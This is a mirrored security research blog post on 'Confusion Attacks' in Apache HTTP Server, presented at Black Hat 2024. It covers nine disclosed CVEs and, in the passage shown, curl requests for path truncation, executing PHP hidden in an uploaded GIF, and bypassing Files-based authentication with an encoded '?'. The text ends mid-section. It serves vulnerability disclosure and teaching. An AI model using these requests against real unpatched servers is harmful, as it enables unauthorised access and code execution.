<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://blog.orange.tw/2024/08/confusion-attacks-en.html">Original</a>
    <h1>Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server</h1>
    
    <div id="readability-page-1" class="page"><div id="doc"><h6 id="Orange-Tsai-orange_8361-nbspnbsp-ÁπÅÈ´î‰∏≠ÊñáÁâàÊú¨-nbspnbsp-English-Version"><a href="#Orange-Tsai-orange_8361-nbspnbsp-ÁπÅÈ´î‰∏≠ÊñáÁâàÊú¨-nbspnbsp-English-Version" title="Orange-Tsai-orange_8361-nbspnbsp-ÁπÅÈ´î‰∏≠ÊñáÁâàÊú¨-nbspnbsp-English-Version"><i></i></a>Orange Tsai (<a href="https://x.com/orange_8361" rel="noopener" target="_blank">@orange_8361</a>) ¬†|¬† <a href="https://blog.orange.tw/2024/08/confusion-attacks-ch.html" rel="noopener" target="_blank">ÁπÅÈ´î‰∏≠ÊñáÁâàÊú¨</a> ¬†|¬† <a href="https://blog.orange.tw/2024/08/confusion-attacks-en.html" rel="noopener" target="_blank">English Version</a></h6><p>Hey there! This is my research on Apache HTTP Server presented at <a href="https://www.blackhat.com/us-24/briefings/schedule/index.html#confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-pre-recorded-40227" rel="noopener" target="_blank">Black Hat USA 2024</a>. Additionally, this research will also be presented at <a href="https://hitcon.org/2024/CMT/agenda/eff94e55-3f1d-4229-a65a-65ade9524421/" rel="noopener" target="_blank">HITCON</a> and <a href="https://orangecon.nl/" rel="noopener" target="_blank">OrangeCon</a>. If you‚Äôre interested in getting a preview, you can check the slides here:</p><blockquote>
<p><a href="https://i.blackhat.com/BH-US-24/Presentations/US24-Orange-Confusion-Attacks-Exploiting-Hidden-Semantic-Thursday.pdf" rel="noopener" target="_blank">Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!</a></p>
</blockquote><p>Also, I would like to thank Akamai for their friendly outreach! They released mitigation measures immediately after this research was published (details can be found on <a href="https://www.akamai.com/blog/security-research/2024-august-apache-waf-proactive-collaboration-orange-tsai-devcore" rel="noopener" target="_blank">Akamai‚Äôs blog</a>).</p><h2 id="TLDR"><a href="#TLDR" title="TLDR"><i></i></a>TL;DR</h2><p>This article explores architectural issues within the Apache HTTP Server, highlighting several technical debts within Httpd, <strong>including 3 types of Confusion Attacks, 9 new vulnerabilities, 20 exploitation techniques, and over 30 case studies</strong>. The content includes, but is not limited to:</p><ol>
<li>How a single <code>?</code> can bypass Httpd‚Äôs built-in access control and authentication.</li>
<li>How unsafe <code>RewriteRules</code> can escape the Web Root and access the entire filesystem.</li>
<li>How to leverage a piece of code from 1996 to transform an XSS into RCE.</li>
</ol><h2 id="Outline"><a href="#Outline" title="Outline"><i></i></a>Outline</h2><ul>
<li><a href="#Before-the-Story">Before the Story</a></li>
<li><a href="#How-Did-the-Story-Begin">How Did the Story Begin?</a></li>
<li><a href="#Why-Apache-HTTP-Server-Smells-Bad">Why Apache HTTP Server Smells Bad?</a></li>
<li><a href="#A-Whole-New-Attack-%E2%80%94-Confusion-Attack">A Whole New Attack ‚Äî Confusion Attack</a>
<ul>
<li><a href="#%F0%9F%94%A5-1-Filename-Confusion">1. Filename Confusion</a>
<ul>
<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-1-1-Truncation">Primitive 1-1. Truncation</a>
<ul>
<li><a href="#%E2%9C%94%EF%B8%8F-1-1-1-Path-Truncation">1-1-1. Path Truncation</a></li>
<li><a href="#%E2%9C%94%EF%B8%8F-1-1-2-Mislead-RewriteFlag-Assignment">1-1-2. Mislead RewriteFlag Assignment</a></li>
</ul>
</li>
<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-1-2-ACL-Bypass">Primitive 1-2. ACL Bypass</a></li>
</ul>
</li>
<li><a href="#%F0%9F%94%A5-2-DocumentRoot-Confusion">2. DocumentRoot Confusion</a>
<ul>
<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-2-1-Server-Side-Source-Code-Disclosure">Primitive 2-1. Server-Side Source Code Disclosure</a>
<ul>
<li><a href="#%E2%9C%94%EF%B8%8F-2-1-1-Disclose-CGI-Source-Code">2-1-1. Disclose CGI Source Code</a></li>
<li><a href="#%E2%9C%94%EF%B8%8F-2-1-2-Disclose-PHP-Source-Code">2-1-2. Disclose PHP Source Code</a></li>
</ul>
</li>
<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-2-2-Local-Gadgets-Manipulation">Primitive 2-2. Local Gadgets Manipulation!</a>
<ul>
<li><a href="#%E2%9C%94%EF%B8%8F-2-2-1-Local-Gadget-to-Information-Disclosure">2-2-1. Local Gadget to Information Disclosure</a></li>
<li><a href="#%E2%9C%94%EF%B8%8F-2-2-2-Local-Gadget-to-XSS">2-2-2. Local Gadget to XSS</a></li>
<li><a href="#%E2%9C%94%EF%B8%8F-2-2-3-Local-Gadget-to-LFI">2-2-3. Local Gadget to LFI</a></li>
<li><a href="#%E2%9C%94%EF%B8%8F-2-2-4-Local-Gadget-to-SSRF">2-2-4. Local Gadget to SSRF</a></li>
<li><a href="#%E2%9C%94%EF%B8%8F-2-2-5-Local-Gadget-to-RCE">2-2-5. Local Gadget to RCE</a></li>
</ul>
</li>
<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-2-3-Jailbreak-from-Local-Gadgets">Primitive 2-3. Jailbreak from Local Gadgets</a>
<ul>
<li><a href="#%E2%9C%94%EF%B8%8F-2-3-1-Jailbreak-from-Local-Gadgets">2-3-1. Jailbreak from Local Gadgets</a></li>
<li><a href="#%E2%9C%94%EF%B8%8F-2-3-2-Jailbreak-Local-Gadgets-to-Redmine-RCE">2-3-2. Jailbreak Local Gadgets to Redmine RCE</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%F0%9F%94%A5-3-Handler-Confusion">3. Handler Confusion</a>
<ul>
<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-3-1-Overwrite-the-Handler">Primitive 3-1. Overwrite the Handler</a>
<ul>
<li><a href="#%E2%9C%94%EF%B8%8F-3-1-1-Overwrite-Handler-to-Disclose-PHP-Source-Code">3-1-1. Overwrite Handler to Disclose PHP Source Code</a></li>
<li><a href="#%E2%9C%94%EF%B8%8F-3-1-2-Overwrite-Handler-to-%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88-%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88-%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88">3-1-2. Overwrite Handler to ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà</a></li>
</ul>
</li>
<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-3-2-Invoke-Arbitrary-Handlers">Primitive 3-2. Invoke Arbitrary Handlers</a>
<ul>
<li><a href="#%E2%9C%94%EF%B8%8F-3-2-1-Arbitrary-Handler-to-Information-Disclosure">3-2-1. Arbitrary Handler to Information Disclosure</a></li>
<li><a href="#%E2%9C%94%EF%B8%8F-3-2-2-Arbitrary-Handler-to-Misinterpret-Scripts">3-2-2. Arbitrary Handler to Misinterpret Scripts</a></li>
<li><a href="#%E2%9C%94%EF%B8%8F-3-2-2-Arbitrary-Handler-to-Full-SSRF">3-2-2. Arbitrary Handler to Full SSRF</a></li>
<li><a href="#%E2%9C%94%EF%B8%8F-3-2-3-Arbitrary-Handler-to-Access-Local-Unix-Domain-Socket">3-2-3. Arbitrary Handler to Access Local Unix Domain Socket</a></li>
<li><a href="#%E2%9C%94%EF%B8%8F-3-2-4-Arbitrary-Handler-to-RCE">3-2-4. Arbitrary Handler to RCE</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%F0%9F%94%A5-4-Other-Vulnerabilities">4. Other Vulnerabilities</a>
<ul>
<li><a href="#%E2%9A%94%EF%B8%8F-CVE-2024-38472---Windows-UNC-based-SSRF">CVE-2024-38472 - Windows UNC-based SSRF</a>
<ul>
<li><a href="#%E2%9C%94%EF%B8%8F-Triggered-via-HTTP-Request-Parser">Triggered via HTTP Request Parser</a></li>
<li><a href="#%E2%9C%94%EF%B8%8F-Triggered-via-Type-Map">Triggered via Type-Map</a></li>
</ul>
</li>
<li><a href="#%E2%9A%94%EF%B8%8F-CVE-2024-39573---SSRF-via-Full-Control-of-RewriteRule-Prefix">CVE-2024-39573 - SSRF via Full Control of RewriteRule Prefix</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#Future-Works">Future Works</a></li>
<li><a href="#Conclusion">Conclusion</a></li>
</ul><h2 id="Before-the-Story"><a href="#Before-the-Story" title="Before-the-Story"><i></i></a>Before the Story</h2><p>This section is just some personal murmurs. If you‚Äôre only interested in the technical details, jump straight to ‚Äî <a href="#How-Did-the-Story-Begin">How Did the Story Begin?</a></p><p>As a researcher, perhaps the greatest joy is seeing your work recognized and understood by peers. Therefore, after completing a significant research with fruitful results, it is natural to want the world to see it ‚Äî which is why I‚Äôve presented multiple times at Black Hat USA and DEFCON. As you might know, since 2022, I have been unable to obtain a valid travel authorization to enter the U.S. (For Taiwan, travel authorization under the <a href="https://esta.cbp.dhs.gov/" rel="noopener" target="_blank">Visa Waiver Program</a> can typically be obtained online within minutes to hours), leading me to miss the in-person talk at <a href="https://www.blackhat.com/us-22/briefings/schedule/index.html#lets-dance-in-the-cache---destabilizing-hash-table-on-microsoft-iis-27199" rel="noopener" target="_blank">Black Hat USA 2022</a>. Even a solo trip to Machu Picchu and Easter Island in 2023 couldn‚Äôt transit through the U.S. :(</p><p>To address this situation, I started preparing for a B1/B2 visa in January this year, writing various documents, interviewing at the embassy, and endlessly waiting. It‚Äôs not fun. But to have my work seen, I still spent a lot of time seeking all possibilities, even until three weeks before the conference, it was unclear whether my talk would be canceled or not (BH only accepted in-person talks, but thanks to the RB, it could ultimately be presented in pre-recorded format). So, everything you see, including slides, videos, and this blog, was completed within just a few dozen days. üòñ</p><p>As a pure researcher with a clear conscience, my attitude towards vulnerabilities has always been ‚Äî they should be directly reported to and fixed by the vendor. Writing these words isn‚Äôt for any particular reason, just to record some feelings of helplessness, efforts in this year, and to thank those who have helped me this year, thank you all :)</p><h2 id="How-Did-the-Story-Begin"><a href="#How-Did-the-Story-Begin" title="How-Did-the-Story-Begin"><i></i></a>How Did the Story Begin?</h2><p>Around the beginning of this year, I started thinking about my next research target. As you might know, I always aim to challenge big targets that can impact the entire internet, so I began searching for some complex topics or interesting open-source projects like Nginx, PHP, or even delved into RFCs to strengthen my understanding of protocol details.</p><p>While most attempts ended in failure (though a few might become topics for next blog posts üòâ), reading these codes reminded me of a quick review I had done of Apache HTTP Server last year! Although I didn‚Äôt dive deep into the code due to the work schedule, I had already ‚Äúsmelled‚Äù something not quite right about its coding style at that time.</p><p>So this year, I decided to continue on that research, transforming the ‚Äúbad smells‚Äù from an indescribable ‚Äúfeeling‚Äù into concrete research on Apache HTTP Server!</p><h2 id="Why-Apache-HTTP-Server-Smells-Bad"><a href="#Why-Apache-HTTP-Server-Smells-Bad" title="Why-Apache-HTTP-Server-Smells-Bad"><i></i></a>Why Apache HTTP Server Smells Bad?</h2><p>Firstly, the Apache HTTP Server is a world constructed by ‚Äúmodules,‚Äù as proudly declared in its <a href="https://httpd.apache.org/docs/2.4/mpm.html" rel="noopener" target="_blank">official documentation</a> regarding its modularity:</p><blockquote>
<p>Apache httpd has always accommodated a wide variety of environments through its modular design. [‚Ä¶] Apache HTTP Server 2.0 extends this modular design to the most basic functions of a web server.</p>
</blockquote><p>The entire Httpd service relies on hundreds of small modules working together to handle a client‚Äôs HTTP request. <strong>Among the <a href="https://httpd.apache.org/docs/2.4/mod/" rel="noopener" target="_blank">136 modules listed by the official documentation</a>, about half are either enabled by default or frequently used by websites</strong>!</p><p>What‚Äôs even more surprising is that these modules also maintain a colossal <code>request_rec</code> structure while processing client HTTP requests. This structure includes all the elements involved in handling HTTP, with its detailed definition available in <a href="https://github.com/apache/httpd/blob/2.4.58/include/httpd.h#L838" rel="noopener" target="_blank">include/httpd.h</a>. All modules depend on this massive structure for synchronization, communication, and data exchange. As an HTTP request passes through several phases, modules act like players in a game of catch, passing the structure from one to another. Each module even has the ability to modify any value in this structure according to its own preferences!</p><p><img alt="" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikgYp2lLRMpR7LLk4jDRRjlR5KYzaOzNO6RUkL_R9zvSAR_Eyt6Gb382AG2BboYC6sRbv8KaBl78IdxSNkBQO1NeTuM-fH98YL8XzJ7aJfV0t_LyeRz6gDfd9eqJYVtEFj-R3OXmQ8leesxFoZol_3yiLuhgTVMI3R_qmVL6lsVVX-SOKq6-XM-QN7p-4/s16000/fb48778b63a5eead717f13f4b.png"/></p><p>This type of collaboration is not new from a software engineering perspective. Each module simply focuses on its own task. As long as everyone finishes their work, then the client can enjoy the service provided by Httpd. This approach might work well with a few modules, <strong>but what happens when we scale it up to hundreds of modules collaborating ‚Äî can they really work  well together?</strong> ü§î</p><p>Our starting point is straightforward ‚Äî <strong>the modules do not fully understand each other, yet they are required to cooperate</strong>. Each module might be implemented by different people, with the code undergoing years of iterations, refactors, and modifications. Do they really still know what they are doing? Even if they understand their own duty, what about other modules‚Äô implementation details? Without any good development standards or guidelines, there must be several gaps that we can exploit!</p><h2 id="A-Whole-New-Attack-‚Äî-Confusion-Attack"><a href="#A-Whole-New-Attack-‚Äî-Confusion-Attack" title="A-Whole-New-Attack-‚Äî-Confusion-Attack"><i></i></a>A Whole New Attack ‚Äî Confusion Attack</h2><p>Based on these observations, we started <strong>focusing on the ‚Äúrelationships‚Äù and ‚Äúinteractions‚Äù among these modules</strong>. If a module accidentally modifies a structure field that it considers unimportant, but is crucial for another module, it could affect the latter‚Äôs decisions. Furthermore, if the definitions or semantics of the fields are not precise enough, causing ambiguities in how modules understand the same fields, it could lead to potential security risks as well!</p><p>From this starting point, we developed three different types of attacks, as these attacks are more or less related to the misuse of structure fields. Hence, we‚Äôve named this attack surface ‚ÄúConfusion Attack,‚Äù and the following are the attacks we developed:</p><ol>
<li><strong>Filename Confusion</strong></li>
<li><strong>DocumentRoot Confusion</strong></li>
<li><strong>Handler Confusion</strong></li>
</ol><p>Through these attacks, we have identified 9 different vulnerabilities:</p><ol>
<li><strong>CVE-2024-38472</strong> - Apache HTTP Server on Windows UNC SSRF</li>
<li><strong>CVE-2024-39573</strong> - Apache HTTP Server proxy encoding problem</li>
<li><strong>CVE-2024-38477</strong> - Apache HTTP Server: Crash resulting in Denial of Service in mod_proxy via a malicious request</li>
<li><strong>CVE-2024-38476</strong> - Apache HTTP Server may use exploitable/malicious backend application output to run local handlers via internal redirect</li>
<li><strong>CVE-2024-38475</strong> - Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path</li>
<li><strong>CVE-2024-38474</strong> - Apache HTTP Server weakness with encoded question marks in backreferences</li>
<li><strong>CVE-2024-38473</strong> - Apache HTTP Server proxy encoding problem</li>
<li><strong>CVE-2023-38709</strong> - Apache HTTP Server: HTTP response splitting</li>
<li><strong>CVE-2024-??????</strong> - [redacted]</li>
</ol><p>These vulnerabilities were reported through the official security mailing list and were addressed by the Apache HTTP Server in the <a href="https://httpd.apache.org/security/vulnerabilities_24.html" rel="noopener" target="_blank">2.4.60 update</a> published on 2024-07-01.</p><p>As this is a new attack surface from Httpd‚Äôs architectural design and its internal mechanisms, naturally, <s>the first person to delve into it can find the most vulnerabilities. Thus, I currently hold the most CVEs from Apache HTTP Server üòâ.</s> it leads to many updates that are not backward compatible. Therefore, patching these issues is not easy for many long-running production servers. If administrators update without careful consideration, they might disrupt existing configurations, causing service downtime. üò®</p><p>Now, it‚Äôs time to get started with our Confusion Attacks! Are you ready?</p><h3 id="üî•-1-Filename-Confusion"><a href="#üî•-1-Filename-Confusion" title="üî•-1-Filename-Confusion"><i></i></a>üî• 1. Filename Confusion</h3><p>The first issue stems from confusion regarding the filename field. Literally, <code>r-&gt;filename</code> should represent a filesystem path. However, in Apache HTTP Server, some modules treat it as a URL. If, within an HTTP context, most modules consider <code>r-&gt;filename</code> as a filesystem path but some others treat it as a URL, this inconsistency can lead to security issues!</p><h4 id="‚öîÔ∏è-Primitive-1-1-Truncation"><a href="#‚öîÔ∏è-Primitive-1-1-Truncation" title="‚öîÔ∏è-Primitive-1-1-Truncation"><i></i></a>‚öîÔ∏è Primitive 1-1. Truncation</h4><p>So, which modules treat <code>r-&gt;filename</code> as a URL? The first is <code>mod_rewrite</code>, which allows sysadmins to easily rewrite a path pattern to a specified substitution target using the <code>RewriteRule</code> directive:</p><pre><code><span><span>RewriteRule</span></span> Pattern Substitution<span> [flags]</span>
</code></pre><p>The target can be either a filesystem path or a URL. This feature likely exists for user experience. However, this ‚Äúconvenience‚Äù also introduces risks. For instance, <strong>while rewriting the target paths, <code>mod_rewrite</code> forcefully treats all results as a URL</strong>, truncating the path after a question mark <code>%3F</code>. This leads to the following two exploitations.</p><p><em><strong>Path: <a href="https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141" rel="noopener" target="_blank">modules/mappers/mod_rewrite.c#L4141</a></strong></em></p><pre><code>
static <span>int</span> apply<span>_rewrite_rule(<span>rewriterule_entry</span> <span>*</span><span>p</span>, <span>rewrite_ctx</span> <span>*</span><span>ctx</span>)</span>
{
    ap_regmatch_t regmatch<span>[AP<span>_MAX_REG_MATCH</span>]</span>;
    apr_array_header_t *rewriteconds;
    rewritecond_entry *conds;
    
    
    
    for (i = <span>0</span>; i &lt; rewriteconds-&gt;nelts; ++i) {
        rewritecond_entry *c = &amp;conds<span>[<span>i</span>]</span>;
        rc = apply<span>_rewrite_cond(<span>c</span>, <span>ctx</span>)</span>;
        
        
        
    }
    
    
    r-&gt;filename = newuri;

    <span>if</span> (ctx-&gt;perdir<span> &amp;&amp; </span>(p-&gt;flags &amp; RULEFLAG_DISCARDPATHINFO)) {
        r-&gt;path_info = NULL;
    }

    splitout<span>_queryargs(<span>r</span>, <span>p</span>-&gt;<span>flags</span>)</span>;         
    
    
}
</code></pre><h5 id="‚úîÔ∏è-1-1-1-Path-Truncation"><a href="#‚úîÔ∏è-1-1-1-Path-Truncation" title="‚úîÔ∏è-1-1-1-Path-Truncation"><i></i></a>‚úîÔ∏è 1-1-1. Path Truncation</h5><p>The first primitive leverages this truncation on the filesystem path. Imagine the following <code>RewriteRule</code>:</p><pre><code><span><span>RewriteEngine</span></span> <span>On</span>
<span><span>RewriteRule</span></span> <span>&#34;^/user/(.+)$&#34;</span> <span>&#34;/var/user/$1/profile.yml&#34;</span>
</code></pre><p>The server would open the corresponding profile based on the username followed by the path <code>/user/</code>, for example:</p><pre><code>$ curl http://server/user/orange
 
</code></pre><p>Since <code>mod_rewrite</code> forcibly treats all rewritten result as a URL, even when the target is a filesystem path, it can be truncated at a question mark, cutting off the tailing <code>/profile.yml</code>, like:</p><pre><code>$ curl http://server/user/orange%2Fsecret.yml%3F
 
</code></pre><p>This is our first primitive ‚Äî Path Truncation. Let‚Äôs pause our exploration of this primitive here for a moment. Although it might seem like a minor flaw for now, remember it‚Äî it will reappear in later attacks, gradually tearing open this seemingly little breach! üòú</p><h5 id="‚úîÔ∏è-1-1-2-Mislead-RewriteFlag-Assignment"><a href="#‚úîÔ∏è-1-1-2-Mislead-RewriteFlag-Assignment" title="‚úîÔ∏è-1-1-2-Mislead-RewriteFlag-Assignment"><i></i></a>‚úîÔ∏è 1-1-2. Mislead RewriteFlag Assignment</h5><p>The second exploitation of the truncation primitive is to mislead the assignment of <code>RewriteFlags</code>. Imagine a sysadmin managing websites and their corresponding handlers through the following <code>RewriteRule</code>:</p><pre><code><span><span>RewriteEngine</span></span> <span>On</span>
<span><span>RewriteRule</span></span>  ^(.+\.php)$  <span>$1</span> <span> [H=application/x-httpd-php]</span>
</code></pre><p>If a request ends with the <code>.php</code> extension, it adds the corresponding handler for the <code>mod_php</code> (this can also be an Environment Variable or Content-Type; you can refer to the official <a href="https://httpd.apache.org/docs/2.4/rewrite/flags.html" rel="noopener" target="_blank">RewriteRule Flags</a> manual for details).</p><p>Since the truncation behavior of the <code>mod_rewrite</code> occurs after the regular expression match, an attacker can use the original rule to apply flags to requests they shouldn‚Äôt apply to by using a <code>?</code>. For example, an attacker could upload a GIF image embedded with malicious PHP code and execute it as a backdoor through the following crafted request:</p><pre><code>$ curl http://server/upload/1.gif
 

$ curl http://server/upload/1.gif%3fooo.php
 
</code></pre><h4 id="‚öîÔ∏è-Primitive-1-2-ACL-Bypass"><a href="#‚öîÔ∏è-Primitive-1-2-ACL-Bypass" title="‚öîÔ∏è-Primitive-1-2-ACL-Bypass"><i></i></a>‚öîÔ∏è Primitive 1-2. ACL Bypass</h4><p>The second primitive of Filename Confusion occurs in the <code>mod_proxy</code>. Unlike the previous primitive which treats targets as a URL in all cases, this time <strong>the authentication and access control bypass is caused by the inconsistent semantic of <code>r-&gt;filename</code> among the modules!</strong></p><p>It actually makes sense for the <code>mod_proxy</code> to treat <code>r-&gt;filename</code> as a URL, given that the primary  purpose of a Proxy is to ‚Äúredirect‚Äù requests to other URLs. However, security issues when different components interact ‚Äî especially the case when most modules by default treat the <code>r-&gt;filename</code> as a filesystem path, imagine you use a file-based access control, and now <code>mod_proxy</code> treats <code>r-&gt;filename</code> as a URL; this inconsistency can lead to the access control or authentication bypass!</p><p>A classic example is when sysadmins use the <code>Files</code> directive to restrict a single file, like <code>admin.php</code>:</p><pre><code><span>&lt;Files &#34;admin.php&#34;&gt;</span>
    <span>AuthType</span> Basic 
    <span>AuthName</span> <span>&#34;Admin Panel&#34;</span>
    <span>AuthUserFile</span> <span>&#34;/etc/apache2/.htpasswd&#34;</span>
    <span>Require</span> valid-user
<span>&lt;/Files&gt;</span>
</code></pre><p>This type of configuration can be bypassed directly under the default PHP-FPM installation! It‚Äôs also worth mentioning that this is one of the most common ways to configure authentication in Apache HTTP Server! Suppose you visit a URL like this:</p><blockquote>
<p><a href="http://server/admin.php%3Fooo.php" rel="noopener" target="_blank">http://server/admin.php%3Fooo.php</a></p>
</blockquote><p>First, in the HTTP lifecycle at this URL, the authentication module will compare the requested filename with the protected files. At this point, the <code>r-&gt;filename</code> field is <code>admin.php?ooo.php</code>, which obviously does not match <code>admin.php</code>, so the module will assume that the current request does not require authentication. However, the PHP-FPM configuration is set to forward requests ending in <code>.php</code> to the <code>mod_proxy</code> using the <code>SetHandler</code> directive:</p><p><em><strong>Path: /etc/apache2/mods-enabled/php8.2-fpm.conf</strong></em></p><pre><code>

<span>&lt;FilesMatch &#34;.+\.ph(?:ar|p|tml)$&#34;&gt;</span>
    <span><span>SetHandler</span></span> <span>&#34;proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost&#34;</span>
<span>&lt;/FilesMatch&gt;</span>
</code></pre><p>The <code>mod_proxy</code> will rewrite <code>r-&gt;filename</code> to the following URL and call the sub-module <code>mod_proxy_fcgi</code> to handle the subsequent FastCGI protocol:</p><blockquote>
<p>proxy:fcgi://127.0.0.1:9000/var/www/html/admin.php?ooo.php</p>
</blockquote><p>Since the backend receives the filename in a strange format, PHP-FPM has to handle this behavior specially. The logic of this handling is as follows:</p><p><em><strong>Path: <a href="https://github.com/php/php-src/blob/ce51bfac759dedac1537f4d5666dcd33fbc4a281/sapi/fpm/fpm/fpm_main.c#L1044" rel="noopener" target="_blank">sapi/fpm/fpm/fpm_main.c#L1044</a></strong></em></p><pre><code><span>#<span>define</span> APACHE_PROXY_FCGI_PREFIX <span>&#34;proxy:fcgi://&#34;</span></span>
<span>#<span>define</span> APACHE_PROXY_BALANCER_PREFIX <span>&#34;proxy:balancer://&#34;</span></span>

<span>if</span> (env_script_filename &amp;&amp;
    strncasecmp(env_script_filename, APACHE_PROXY_FCGI_PREFIX, <span>sizeof</span>(APACHE_PROXY_FCGI_PREFIX) - <span>1</span>) == <span>0</span>) {
    
    <span>char</span> *p = env_script_filename + (<span>sizeof</span>(APACHE_PROXY_FCGI_PREFIX) - <span>1</span>);
    <span>while</span> (*p != <span>&#39;\0&#39;</span> &amp;&amp; *p != <span>&#39;/&#39;</span>) {
        p++;    
    }
    <span>if</span> (*p != <span>&#39;\0&#39;</span>) {
        
        memmove(env_script_filename, p, <span>strlen</span>(p) + <span>1</span>);
        apache_was_here = <span>1</span>;
    }
    
    p = <span>strchr</span>(env_script_filename, <span>&#39;?&#39;</span>);
    <span>if</span> (p) {
        *p =<span>0</span>;
    }
}
</code></pre><p>As you can see, PHP-FPM first normalizes the filename and splits it at the question mark <code>?</code> to extract the actual file path for execution (which is <code>/var/www/html/admin.php</code>). This leads to the bypass, and basically, <strong>all authentications or access controls based on the <code>Files</code> directive for a single PHP file are at risk when running together with PHP-FPM!</strong> üòÆ</p><p>Many potentially risky configurations can be found on GitHub, such as <code>phpinfo()</code> restricted to internal network access only:</p><pre><code>
<span>&lt;Files php-info.php&gt;</span>
    
    

    
    <span>Require</span> ip 10 172 192.168
<span>&lt;/Files&gt;</span>
</code></pre><p>Adminer blocked by <code>.htaccess</code>:</p><pre><code><span>&lt;Files adminer.php&gt;</span>
    <span><span>Order</span></span> Allow,Deny
    <span><span>Deny</span></span> from <span>all</span>
<span>&lt;/Files&gt;</span>
</code></pre><p>Protected <code>xmlrpc.php</code>:</p><pre><code><span>&lt;Files xmlrpc.php&gt;</span>
    <span><span>Order</span></span> Allow,Deny
    <span><span>Deny</span></span> from <span>all</span>
<span>&lt;/Files&gt;</span>
</code></pre><p>CLI tools prevented from direct access:</p><pre><code><span>&lt;Files &#34;cron.php&#34;&gt;</span>
    <span><span>Deny</span></span> from <span>all</span>
<span>&lt;/Files&gt;</span>
</code></pre><p>Through an inconsistency in how the authentication module and <code>mod_proxy</code> interpret the <code>r-&gt;filename</code> field, all the above examples can be successfully bypassed with just a <code>?</code>.</p><h3 id="üî•-2-DocumentRoot-Confusion"><a href="#üî•-2-DocumentRoot-Confusion" title="üî•-2-DocumentRoot-Confusion"><i></i></a>üî• 2. DocumentRoot Confusion</h3><p>The next attack we‚Äôre diving into is the confusion based on DocumentRoot! Let‚Äôs consider this Httpd configuration for a moment:</p><pre><code><span><span>DocumentRoot</span></span> /var/www/html
<span><span>RewriteRule</span></span>  ^/html/(.*)$   /<span>$1</span>.html
</code></pre><p>When you visit the URL <code>http://server/html/about</code>, which file do you think Httpd actually opens? Is it the one under the root directory, <code>/about.html</code>, or is it from the DocumentRoot at <code>/var/www/html/about.html</code>?</p><p><img alt="" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjScayqYftXgljHb7XT1u40K_0NhQwYADC85CmsktljaeW3X_xf-YtHdOOP6qYtw7mg1jxLpiwlq-UHC0FBbyiNqmxC_hPlnirbDKB1IvqllsspUxP9jwoB3W6Hc7HHhpo4SMlNuHBOcKkjfahfvWeETjS4naM0PCkfiWUvsaNY9oFSt5nLmkpTaxhE3U/s16000/cdfa0bc047573a4162a57c6e8.png"/></p><p>The answer is ‚Äî <strong>it accesses both paths</strong>. Yep, that‚Äôs our second Confusion Attack. <strong>For any<sup>[1]</sup> <code>RewriteRule</code>, Apache HTTP Server always tries to open both the path with DocumentRoot and without it!</strong> Amazing, right? üòâ</p><p><em>[1] Located within <code>Server Config</code> or <code>VirtualHost Block</code></em></p><p><em><strong>Path: <a href="https://github.com/apache/httpd/blob/c3ad18b7ee32da93eabaae7b94541d3c32264340/modules/mappers/mod_rewrite.c#L4939" rel="noopener" target="_blank">modules/mappers/mod_rewrite.c#L4939</a></strong></em></p><pre><code>    <span><span>if</span>(!(conf-&gt;</span>options &amp; OPTION_LEGACY_PREFIX_DOCROOT)) {
        <span><span>uri_reduced</span> = apr_table_get(r-&gt;</span>notes, <span>&#34;mod_rewrite_uri_reduced&#34;</span>);
    }

    <span><span>if</span> (!prefix_stat(r-&gt;</span><span><span>filename</span>, r-&gt;</span>pool) || uri_reduced != NULL) {     
        int res;
        <span><span>char</span> *tmp = r-&gt;</span>uri;

        <span><span>r</span>-&gt;</span><span><span>uri</span> = r-&gt;</span>filename;
        res = ap_core_translate(r);             
        <span><span>r</span>-&gt;</span>uri = tmp;

        <span>if</span> (res != OK) {
            rewritelog((r, <span>1</span>, NULL, <span>&#34;prefixing with document_root of %s&#34;</span>
                        <span>&#34; FAILED&#34;</span>, <span><span>r</span>-&gt;</span>filename));

            return res;
        }

        rewritelog((r, <span>2</span>, NULL, <span>&#34;prefixed with document_root to %s&#34;</span>,
                    <span><span>r</span>-&gt;</span>filename));
    }

    <span><span>rewritelog</span>((r, 1, NULL, &#34;go-ahead <span>with</span> %s [OK]&#34;, r-&gt;</span>filename));
    return OK;
}
</code></pre><p>Most of the time, the version without DocumentRoot doesn‚Äôt exist, so Apache HTTP Server goes for the version with the DocumentRoot. But this behavior already lets us ‚Äúintentionally‚Äù access paths outside the Web Root. <strong>If today we can control the prefix of the <code>RewriteRule</code>, couldn‚Äôt we access any file on the system?</strong> That‚Äôs the spirit of our second Confusion Attack! You can find numerous problematic configurations on GitHub, and even <a href="https://httpd.apache.org/docs/current/rewrite/remapping.html#rewrite-query" rel="noopener" target="_blank">the examples from official Apache HTTP Server documentations</a> are vulnerable to attacks:</p><pre><code>
